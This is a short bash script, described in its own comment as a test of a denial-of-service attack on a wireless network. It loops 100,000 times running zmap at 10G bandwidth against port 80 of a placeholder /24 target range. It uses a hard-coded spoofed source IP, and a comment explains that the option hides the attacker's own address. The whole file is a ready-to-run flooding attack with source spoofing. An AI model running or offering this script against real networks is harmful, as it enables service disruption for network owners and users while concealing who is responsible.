#! /bin/bash
# Purpose : To test the DOS attack on the wireless network

for i in {1..100000}
do
    zmap -i eth1 -S 85.118.181.8 -B 10G -p 80 -T 10 -P 10 <Target IP/24> # -S is a spoofed IP rather than your own | <Target IP/24> is the IP and range of the target eg 10.10.10.10/24
    sleep 5s
done
